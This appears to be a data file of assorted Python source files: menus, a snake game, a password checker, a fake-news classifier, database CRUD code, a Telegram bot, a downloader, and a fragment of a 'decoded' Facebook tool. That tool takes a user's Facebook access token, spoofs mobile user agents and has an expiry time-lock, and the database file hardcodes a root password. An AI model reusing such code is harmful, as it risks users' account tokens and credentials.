print(\"1:Checkout Book  2:Return Book  3:Return to Main Menu\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 4:\r\n                switcher = {\r\n                    1: self.db.checkout,\r\n                    2: self.db.returnBook,\r\n                    3: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is not a valid option try a number from 1-3.\")\r\n                self.checkingReturning()\r\n        except ValueError:\r\n            print(\"This is not a valid option try a number from 1-3.\")\r\n            self.checkingReturning()\r\n        \r\n     \r\n    #this will allow the user to manage the books,    \r\n    def manageBooks(self):\r\n        print(\"1:Insert New Book  2:Find Book  3: Update Book Information  4:Delete Book  5: Return to main menu\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 6:\r\n                switcher = {\r\n                    1: self.db.insert,\r\n                    2: self.db.select,\r\n                    3: self.db.update,\r\n                    4: self.db.delete,\r\n                    5: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is not a valid option try a number from 1-5.\")\r\n                self.manageBooks()\r\n        except ValueError:\r\n            print(\"This is not a valid option try a number from 1-5.\")\r\n            self.manageBooks()\r\n\r\n    #This will allow the user to manage the borrowers    \r\n    def userInformation(self):\r\n        print(\"1:Look Up User Information  2:Add New User  3: Delete User  4: Update User Information  5: Return to main menu\")\r\n        try:   \r\n            userInput = int(input())\r\n            if 0 < userInput < 6:\r\n                switcher = {\r\n                    1: self.db.findUserInformation,\r\n                    2: self.db.addUser,\r\n                    3: self.db.deleteUser, \r\n                    4: self.db.updateUser, \r\n                    5: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is nor a valid option try a number from 1-5.\")\r\n                self.userInformation()\r\n        except ValueError:\r\n            print(\"This is nor a valid option try a number from 1-5.\")\r\n            self.userInformation()\r\n    \r\n    def termination(self):\r\n        self.db.close_connection()\r\n        print(\"The program has closed.\")\r\n        sys.exit()\r\n    \r\n    ",
    "import random\nfrom turtle import Turtle\n\nSTARTING_POSITIONS = [(0, 0), (-20, 0), (-40, 0)]\nMOVE_DISTANCE = 15\nUP = 90\nDOWN = 270\nLEFT = 180\nRIGHT = 0\n\nNEON_COLORS = [\n    \"#ff6eff\", \"#ff00ff\", \"#cc00ff\", \"#9900ff\", \"#6600ff\",\n    \"#3300ff\", \"#0000ff\", \"#0033ff\", \"#0066ff\", \"#0099ff\",\n    \"#00ccff\", \"#00ffff\", \"#00ffcc\", \"#00ff99\", \"#00ff66\",\n    \"#00ff33\", \"#00ff00\", \"#33ff00\", \"#66ff00\", \"#99ff00\"\n]\n\nclass Snake:\n\n    def __init__(self):\n        self.segments = []\n        self.broken_snake_bits = []\n        self.generate_snake()\n        self.head = self.segments[0]\n\n    def generate_snake(self):\n        for each in STARTING_POSITIONS:\n            self.add_segment(each)\n\n    def add_segment(self, position):\n        new_segment = Turtle('square')\n        new_segment.penup()\n        new_segment.color('#06FA45')\n        new_segment.goto(position)\n        self.segments.append(new_segment)\n\n    def remove_segment(self):\n        snake_bits = self.segments[2:]\n        del self.segments[2:]\n        for each in snake_bits:\n            each.color('red')\n        self.broken_snake_bits.extend(snake_bits)\n\n    def extend(self):\n        self.add_segment(self.segments[-1].position())\n\n    def clear_screen_of_snake_parts(self):\n        for each in self.broken_snake_bits:\n            each.hideturtle()\n\n    def rainbow_segments(self):\n        for each in self.segments:\n            each.color(random.choice(NEON_COLORS))\n\n    def solid_color_change_segment(self):\n        a = random.choice(NEON_COLORS)\n        for each in self.segments:\n            each.color(a)\n\n    def bloody_mouth(self):\n        self.head.color('red')\n\n    def no_bloody_mouth(self):\n        self.head.color(\"#06FA45\")\n\n    def clean_movement(self):\n        for seg_num in range(len(self.segments) - 1, 0, -1):\n            # grab next segments cords\n            new_x = self.segments[seg_num - 1].xcor()\n            new_y = self.segments[seg_num - 1].ycor()\n\n            self.segments[seg_num].goto(new_x, new_y)\n\n    def move(self):\n        self.clean_movement()\n        self.head.forward(MOVE_DISTANCE)\n\n    def turn(self, direction, degree_of_turn):\n        self.clean_movement()\n        if direction == 'left':\n            self.head.left(degree_of_turn)\n        elif direction == 'right':\n            self.head.right(degree_of_turn)\n\n    def up(self):\n        if self.head.heading() != DOWN:\n            self.head.setheading(UP)\n\n    def down(self):\n        if self.head.heading() != UP:\n            self.head.setheading(DOWN)\n\n    def left(self):\n        if self.head.heading() != RIGHT:\n            self.head.setheading(LEFT)\n\n    def right(self):\n        if self.head.heading() != LEFT:\n            self.head.setheading(RIGHT)\n\n\n\n\n\n\n",
    "word_list = [\n'abruptly', \n'absurd', \n'abyss', \n'affix', \n'askew', \n'avenue', \n'awkward', \n'axiom', \n'azure', \n'bagpipes', \n'bandwagon', \n'banjo', \n'bayou', \n'beekeeper', \n'bikini', \n'blitz', \n'blizzard', \n'boggle', \n'bookworm', \n'boxcar', \n'boxful', \n'buckaroo', \n'buffalo', \n'buffoon', \n'buxom', \n'buzzard', \n'buzzing', \n'buzzwords', \n'caliph', \n'cobweb', \n'cockiness', \n'croquet', \n'crypt', \n'curacao', \n'cycle', \n'daiquiri', \n'dirndl', \n'disavow', \n'dizzying', \n'duplex', \n'dwarves', \n'embezzle', \n'equip', \n'espionage', \n'euouae', \n'exodus', \n'faking', \n'fishhook', \n'fixable', \n'fjord', \n'flapjack', \n'flopping', \n'fluffiness', \n'flyby', \n'foxglove', \n'frazzled', \n'frizzled', \n'fuchsia', \n'funny', \n'gabby', \n'galaxy', \n'galvanize', \n'gazebo', \n'giaour', \n'gizmo', \n'glowworm', \n'glyph', \n'gnarly', \n'gnostic', \n'gossip', \n'grogginess', \n'haiku', \n'haphazard', \n'hyphen', \n'iatrogenic', \n'icebox', \n'injury', \n'ivory', \n'ivy', \n'jackpot', \n'jaundice', \n'jawbreaker', \n'jaywalk', \n'jazziest', \n'jazzy', \n'jelly', \n'jigsaw', \n'jinx', \n'jiujitsu', \n'jockey', \n'jogging', \n'joking', \n'jovial', \n'joyful', \n'juicy', \n'jukebox', \n'jumbo', \n'kayak', \n'kazoo', \n'keyhole', \n'khaki', \n'kilobyte', \n'kiosk', \n'kitsch', \n'kiwifruit', \n'klutz', \n'knapsack', \n'larynx', \n'lengths', \n'lucky', \n'luxury', \n'lymph', \n'marquis', \n'matrix', \n'megahertz', \n'microwave', \n'mnemonic', \n'mystify', \n'naphtha', \n'nightclub', \n'nowadays', \n'numbskull', \n'nymph', \n'onyx', \n'ovary', \n'oxidize', \n'oxygen', \n'pajama', \n'peekaboo', \n'phlegm', \n'pixel', \n'pizazz', \n'pneumonia', \n'polka', \n'pshaw', \n'psyche', \n'puppy', \n'puzzling', \n'quartz', \n'queue', \n'quips', \n'quixotic', \n'quiz', \n'quizzes', \n'quorum', \n'razzmatazz', \n'rhubarb', \n'rhythm', \n'rickshaw', \n'schnapps', \n'scratch', \n'shiv', \n'snazzy', \n'sphinx', \n'spritz', \n'squawk', \n'staff', \n'strength', \n'strengths', \n'stretch', \n'stronghold', \n'stymied', \n'subway', \n'swivel', \n'syndrome', \n'thriftless', \n'thumbscrew', \n'topaz', \n'transcript', \n'transgress', \n'transplant', \n'triphthong', \n'twelfth', \n'twelfths', \n'unknown', \n'unworthy', \n'unzip', \n'uptown', \n'vaporize', \n'vixen', \n'vodka', \n'voodoo', \n'vortex', \n'voyeurism', \n'walkway', \n'waltz', \n'wave', \n'wavy', \n'waxy', \n'wellspring', \n'wheezy', \n'whiskey', \n'whizzing', \n'whomever', \n'wimpy', \n'witchcraft', \n'wizard', \n'woozy', \n'wristwatch', \n'wyvern', \n'xylophone', \n'yachtsman', \n'yippee', \n'yoked', \n'youthful', \n'yummy', \n'zephyr', \n'zigzag', \n'zigzagging', \n'zilch', \n'zipper', \n'zodiac', \n'zombie', \n]",
    "# import needed libraries\nimport string\n\n# Funny Colorful in ASCII when program start\ntitle = \"\"\"\\033[94m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m     \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\\033[0m    \\033[1;32m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\\033[0m    \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m  \n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2550\u255d\\033[0m     \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u255d\\033[0m  \n\\033[1;31m\u2588\u2588\u2551\\033[0m         \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u255a\u2550\u255d\\033[0m         \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31mPassword    \\033[1;32mSecurity    \\033[1;33mStrength    \\033[1;34mEvaluator\n\\033[0m\"\"\"\n\nprint(title)\n\ndef main():\n    # user add the password to check\n    password = input(\"\\033[1;31mEnter The Password: \\n\\033[0m\")\n    if password == \"\":\n        print(\"\\033[1;31mNo Input!! Try again\\n\\033[0m\")\n        return main()\n    \n    # get the length of passwrod that user added\n    lenght = len(password)\n    level = 0 \n    \n    # make a bool variables of rules we need to check out\n    lowercase = False\n    uppercase = False\n    digits = False\n    symbols = False\n\n    # loop in the password looking for if rules done\n    for i in password:\n        if i in string.ascii_lowercase:\n            lowercase = True\n        if i in string.ascii_uppercase:\n            uppercase = True\n        if i in string.digits:\n            digits = True\n        if i not in string.ascii_lowercase and i not in string.ascii_uppercase and i not in string.digits:\n            symbols = True\n    \n    # print new values of rules\n    print(\"\\nwhat we found in your password(\",password,\"):\")  \n    print(\"contain lowercase: \", lowercase)\n    print(\"contain uppercase: \", uppercase)\n    print(\"contain digits: \", digits)\n    print(\"contain symbols: \", symbols)\n    print(\"length of password: \", lenght)\n    \n    # here we decied what level of strong of the password\n    if lenght > 8:\n        level += 1\n\n    if lowercase == True:\n        level += 1\n\n    if uppercase == True:\n        level += 1\n\n    if digits == True:\n        level += 1\n\n    if symbols == True:\n        level += 1\n\n    # if all done but password less than 6 letters wo it will be week password\n    if lenght < 6:\n        level = 1\n\n    # output how much password strong with some colors for every level\n    if level == 1:\n        print(\"\\033[1;31mWeek Password! level is:\",level,\"\\033[0m\")\n\n    if level == 2:\n        print(\"\\033[1;34mBad Password, level is:\",level,\"\\033[0m\")\n\n    if level == 3:\n        print(\"\\033[1;33mMedium Password, level is:\",level,\"\\033[0m\")\n\n    if level == 4:\n        print(\"\\033[1;92mGood Password, level is:\",level,\"\\033[0m\")\n\n    if level == 5:\n        print(\"\\033[1;32mStrong Password, level is:\",level,\"\\033[0m\")\n        \n    # ask for test other password\n    while True:\n        q = input(\"\\nAgain? (y/n) \")\n        if q == \"y\" or q == \"\":\n            return main()\n        elif q == \"n\":\n            exit()       \n        else:\n            print(\"\\033[1;31mwronge input!\\033[0m\")\n            \n# call main function\nmain()\n",
    "import pandas as pd\nfrom textblob import TextBlob\nimport spacy\nimport textstat\nfrom spacy.lang.en.stop_words import STOP_WORDS\nfrom transformers import DistilBertForSequenceClassification, Trainer, TrainingArguments\nfrom transformers import DistilBertTokenizerFast\nfrom datasets import Dataset\nfrom sklearn.metrics import accuracy_score\nfrom transformers import EvalPrediction\nimport numpy as np\n\n# Initialize spaCy\nnlp = spacy.load(\"en_core_web_sm\")\n\n# Load dataset\ndf = pd.read_csv('Random_sampling.csv')\nprint(\"1\")\n\n# Define a mapping from label strings to integers\nlabel_to_int = {\"FAKE\": 0, \"REAL\": 1}\n\n# Apply this mapping to your labels\ndf['label'] = df['label'].map(label_to_int)\nprint(\"1.1\")\n\n# Preprocessing function for NER\ndef preprocess_text_for_ner(text):\n    doc = nlp(text)\n    preprocessed_text = ' '.join([token.lemma_.lower() for token in doc if token.text.lower() not in STOP_WORDS and token.is_alpha])\n    return preprocessed_text\n\ndf['preprocessed_text'] = df['text'].apply(preprocess_text_for_ner)\n\n# Additional text analyses\ndf['article_length'] = df['text'].apply(lambda x: len(x.split()))\ndf['sentiment'] = df['text'].apply(lambda x: TextBlob(x).sentiment.polarity)\ndf['readability'] = df['text'].apply(lambda x: textstat.flesch_reading_ease(x))\ndf['entities_count'] = df['text'].apply(lambda x: len(nlp(x).ents))\nprint(\"2\")\n\n\ntokenizer = DistilBertTokenizerFast.from_pretrained('distilbert-base-uncased')\n\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding=\"max_length\", truncation=True)\n    #return tokenizer(examples['preprocessed_text'], padding=\"max_length\", truncation=True)  \n\n#hf_dataset = Dataset.from_pandas(df[['preprocessed_text', 'label']])\nhf_dataset = Dataset.from_pandas(df[['text', 'label']])\ntokenized_dataset = hf_dataset.map(tokenize_function, batched=True)\ntrain_test_dataset = tokenized_dataset.train_test_split(test_size=0.2)\nprint(\"3\")\nmodel = DistilBertForSequenceClassification.from_pretrained('distilbert-base-uncased', num_labels=2)\nprint(\"3\")\ntraining_args = TrainingArguments(\n    output_dir='./results',\n    num_train_epochs=3,\n    per_device_train_batch_size=8,\n    warmup_steps=500,\n    weight_decay=0.01,\n    logging_dir='./logs',\n)\n\ndef compute_metrics(p: EvalPrediction):\n    preds = np.argmax(p.predictions, axis=1)\n    accuracy = accuracy_score(p.label_ids, preds)\n    # Ensure the key matches what you expect\n    return {\"eval_accuracy\": accuracy}\n\n\n# Include the compute_metrics function in your Trainer setup\ntrainer = Trainer(\n    model=model,\n    args=training_args,\n    train_dataset=train_test_dataset['train'],\n    eval_dataset=train_test_dataset['test'],\n    compute_metrics=compute_metrics,\n)\n\ntrainer.train()\n\nresults = trainer.evaluate()\nprint(results)\n\nprint(\"Test set accuracy:\", results['eval_accuracy'])\n\n\n",
    "import mysql.connector\r\n\r\n# Establish connection to MySQL database\r\nmydb = mysql.connector.connect(\r\n    host=\"localhost\",\r\n    user=\"root\",\r\n    password=\"SALAH.BERRET.0\",\r\n    database=\"company_management\"\r\n)\r\n\r\n# Function to fetch all employee records from the database\r\ndef fetch_employee():\r\n    cur = mydb.cursor()\r\n    cur.execute(\"SELECT * FROM employee\")\r\n    rows = cur.fetchall()\r\n    cur.close()\r\n    return rows\r\n\r\n# Function to insert a new employee record into the database\r\ndef insert_employee(emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL INSERT statement\r\n    cur.execute(\"INSERT INTO employee VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\", (emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to delete an employee record from the database\r\ndef delete_employee(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL DELETE statement\r\n    cur.execute(\"DELETE FROM employee WHERE emp_id=%s\", (emp_id,))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to update an employee record in the database\r\ndef update_employee(new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL UPDATE statement\r\n    cur.execute(\"UPDATE employee SET first_name = %s, last_name = %s, birth_day = %s, sex = %s, salary = %s, super_id = %s, branch_id = %s WHERE emp_id = %s\", (new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to check if an employee with the given ID exists in the database\r\ndef id_exists(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL SELECT statement to count the number of rows with the given ID\r\n    cur.execute(\"SELECT COUNT(*) FROM employee WHERE emp_id = %s\", (emp_id,))\r\n    count = cur.fetchone()[0]\r\n    cur.close()\r\n    # Return True if count is greater than 0, indicating the ID exists; otherwise, return False\r\n    return count > 0\r\n",
    "from aiogram import Bot, Dispatcher\nfrom aiogram.types import Message\nimport httpx\nimport json\nimport os\n\ndp = Dispatcher()\n\n\nasync def send_to_graph(id: str, message: str):\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"http://graph:3311/send_message\",\n            params={\"id\": id, \"message\": message},\n        )\n    answer = (\n        response.json()[\"answer\"] + \"\\n\\n\" + unpack_buttons(response.json()[\"buttons\"])\n    )\n\n    return answer\n\n\ndef unpack_buttons(buttons: list) -> str:\n    answer = \"\"\n    for button in buttons:\n        answer += \" -\" + button + \"\\n\"\n    return answer\n\n\n@dp.message()\nasync def message_handler(message: Message):\n    # with open('logs.txt', 'a') as f:\n    #     f.write(str(message.from_user.id) + \" \" + message.text)\n    #     f.write('\\n')\n    answer = await send_to_graph(str(message.from_user.id), message.text)\n    return await message.answer(answer)\n\n\nasync def main(token: str = os.environ[\"TELEGRAM_BOT_TOKEN\"]):\n    import logging\n    import sys\n\n    app = Bot(token)\n    logging.basicConfig(level=logging.INFO, stream=sys.stdout)\n    await dp.start_polling(app)\n\n\nif __name__ == \"__main__\":\n    import asyncio\n\n    asyncio.run(main())\n",
    "#Decoded By Hso AND Levi: @sis_f  On: @Q_B_H \n\n\n\nfoo = False\nif foo:\n    pass\nimport random\nimport re\nimport time\nimport sys\nimport requests\nfrom time import time as mek\nfrom bs4 import BeautifulSoup as par\nfrom rich.progress import Progress, TextColumn\nfrom concurrent.futures import ThreadPoolExecutor as Modol\nimport requests\nimport bs4\nimport json\nimport os\nimport sys\nimport random\nimport datetime\nimport time\nimport re\nimport threading\nimport urllib3\nimport rich\nimport base64\nimport threading\nfrom rich.table import Table as me\nfrom rich.console import Console as sol\nfrom bs4 import BeautifulSoup as sop\nfrom bs4 import BeautifulSoup as parser\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom rich.console import Group as gp\nfrom rich.panel import Panel as nel\nfrom rich import print as cetak\nfrom rich.markdown import Markdown as mark\nfrom rich.columns import Columns as col\nfrom rich import print as rprint\nfrom rich import pretty\nfrom rich.text import Text as tekz\nimport os\nnow = datetime.datetime.today()\nmm = str(now.month)\ndd = str(now.day)\nyyyy = str(now.year)\nhour = str(now.hour)\nmi = str(now.minute)\nss = str(now.second)\nt = mm + '''/''' + dd + '''/''' + yyyy + ''' ''' + hour + ''':''' + mi + ''':''' + ss\nhours = now.hour\nx = datetime.datetime.now()\ng = datetime.datetime(2023, 9, 8, 1, 0, 0)\nif x.strftime('''%x''') > g.strftime('''%x'''):\n    print('''\n\n''')\n    print('''     ''' + ' \u0627\u0646\u062a\u0647\u0626 \u0627\u0644\u062a\u0641\u0639\u064a\u0644 \u0631\u0627\u0633\u0644 \u0627\u0644\u0645\u0637\u0648\u0631 \u0644\u0644\u062d\u0635\u0648\u0644 \u0639 \u0627\u062d\u062f\u062b \u0646\u0633\u062e\u0647@XD_0O')\n    print('''\n\n''')\n    print(x)\n    sys.exit(0)\nif x.strftime('''%x''') == g.strftime('''%x'''):\n    print('''''')\n    if x.strftime('''%X''') > g.strftime('''%X'''):\n        print('''\n\n''')\n        print('''     ''' + ' \u062a\u0631\u064a\u062f \u062a\u0641\u0639\u0628\u0644 \u0627\u062f\u0627\u0629 \u0631\u0627\u0633\u0644\u0646\u064a \u0648\u062d\u0636\u0631 \u0645\u0642\u0627\u0628\u0644\u0643 @XD_0O')\n        print('''\n\n''')\n        print(x)\n        sys.exit(0)\n    else:\n        print('''''')\nelse:\n    print('''''')\nprint('''''')\n\ntry:\n    import rich\nexcept:\n    pass\ncetak(nel('\\t\u2022WELCOME MY TOOL FACEBOOK\u2022'))\nos.system('''pip install rich''')\n\ntry:\n    import stdiomask\nexcept:\n    pass\ncetak(nel('\\t\u2022 WELCOME MY TOOL FACEBOOK \u2022'))\nos.system('''pip install stdiomask''')\n\ntry:\n    import requests\nexcept:\n    pass\nZ = '''\u001b[1;31m'''\nR = '''\u001b[1;31m'''\nX = '''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33m'''\nZ = '''\u001b[1;31m'''\nX = '''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nC = '''\u001b[1;97m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33'''\nprint(F + '''FACE''' + F + '\ud835\ude71\ud835\ude7e\ud835\ude7e\ud835\ude7a ' + F + 'To' + F + 'ol' + Z)\nprint(F + '\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae')\nprint(F + '\u27a8 ' + Y + 'BY ' + E + '@XD_0O' + X + '| @XD_0O' + Z)\nprint(F + '\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9')\nprint('''\n''')\ntoken = input(B + 'token\u27a4\u062a\u06c1\u0648\u0643\u06c1\u0646\u06c1\u0643 : ' + X)\nprint('''\n''')\nID = input(B + 'ID\u27a4\u0622\u064a\u06c1\u062f\u064a\u06c1\u0643    : ' + R)\npretty.install()\nCON = sol()\nuser_agent = [\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]''',\n    '''Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Ge",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\nfrom tkinter import filedialog\r\nimport os\r\nimport time\r\nimport requests\r\nimport json\r\n\r\nclass RareFinderGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Rare Finder\")\r\n\r\n        # Create widgets\r\n        self.base_url_label = ttk.Label(master, text=\"Base URL:\")\r\n        self.base_url_entry = ttk.Entry(master, width=50)\r\n        self.base_url_entry.insert(0, \"https://we-assets.pinit.io/J2Q2j6kpSg7tq8JzueCHNTQNcyNnQkvr85RhsFnYZWeG/f7ac2fd2-13c4-4ca1-85ee-962772caf73e\")\r\n\r\n        self.main_folder_label = ttk.Label(master, text=\"Main Folder Name:\")\r\n        self.main_folder_entry = ttk.Entry(master, width=50)\r\n        self.main_folder_entry.insert(0, \"OutPut Folder\")\r\n\r\n        self.delay_label = ttk.Label(master, text=\"Download Delay (seconds):\")\r\n        self.delay_entry = ttk.Entry(master, width=10)\r\n        self.delay_entry.insert(0, \"0.0001\")\r\n\r\n        self.directory_size_label = ttk.Label(master, text=\"Directory Size:\")\r\n        self.directory_size_entry = ttk.Entry(master, width=10)\r\n        self.directory_size_entry.insert(0, \"4444\")\r\n\r\n        self.keywords_label = ttk.Label(master, text=\"Keywords (comma-separated):\")\r\n        self.keywords_entry = ttk.Entry(master, width=50)\r\n\r\n        self.start_button = ttk.Button(master, text=\"Step 1: Download Directories\", command=self.step1_download)\r\n        self.search_button = ttk.Button(master, text=\"Step 2: Search Keywords\", command=self.step2_search)\r\n        self.select_directory_button = ttk.Button(master, text=\"Select Directory\", command=self.select_directory)\r\n\r\n        self.console_label = ttk.Label(master, text=\"Console:\")\r\n        self.console_text = tk.Text(master, width=80, height=20)\r\n\r\n        # Grid layout\r\n        self.base_url_label.grid(row=0, column=0, sticky=\"w\")\r\n        self.base_url_entry.grid(row=0, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.main_folder_label.grid(row=1, column=0, sticky=\"w\")\r\n        self.main_folder_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.delay_label.grid(row=2, column=0, sticky=\"w\")\r\n        self.delay_entry.grid(row=2, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.directory_size_label.grid(row=3, column=0, sticky=\"w\")\r\n        self.directory_size_entry.grid(row=3, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.keywords_label.grid(row=4, column=0, sticky=\"w\")\r\n        self.keywords_entry.grid(row=4, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.start_button.grid(row=5, column=0, columnspan=3, pady=10)\r\n        self.search_button.grid(row=6, column=0, columnspan=3, pady=10)\r\n        self.select_directory_button.grid(row=7, column=0, columnspan=3, pady=10)\r\n        self.console_label.grid(row=8, column=0, sticky=\"w\")\r\n        self.console_text.grid(row=9, column=0, columnspan=3, padx=10, pady=5, sticky=\"ew\")\r\n\r\n    def step1_download(self):\r\n        self.base_url = self.base_url_entry.get()\r\n        self.main_folder = self.main_folder_entry.get()\r\n        self.delay = float(self.delay_entry.get())\r\n        self.directory_size = int(self.directory_size_entry.get())\r\n\r\n        directories = {'': self.directory_size}  # Specified directory size\r\n\r\n        for directory, count in directories.items():\r\n            folder = os.path.join(self.main_folder, directory)\r\n            if not os.path.exists(folder):\r\n                os.makedirs(folder)\r\n\r\n            for i in range(0, count + 1):\r\n                url = f'{self.base_url}{directory}/{i}.json'\r\n                self.download_json(url)\r\n\r\n                time.sleep(self.delay)\r\n\r\n        messagebox.showinfo(\"Information\", \"Directory download process completed.\")\r\n        self.search_button.config(state=tk.NORMAL)\r\n\r\n    def download_json(self, url):\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                file_path = os.path.join(self.main_folder, f\"{url.split('/')[-1]}\")\r\n                with open(file_path, 'wb') as file:\r\n                    file.write(response.content)\r\n            else:\r\n                self.log(f\"Failed to download JSON from {url}. Status code: {response.status_code}\")\r\n        except Exception as e:\r\n            self.log(f\"Error downloading JSON from {url}: {e}\")\r\n\r\n    def step2_search(self):\r\n        keywords = [keyword.strip().lower() for keyword in self.keywords_entry.get().split(',')]\r\n        results = 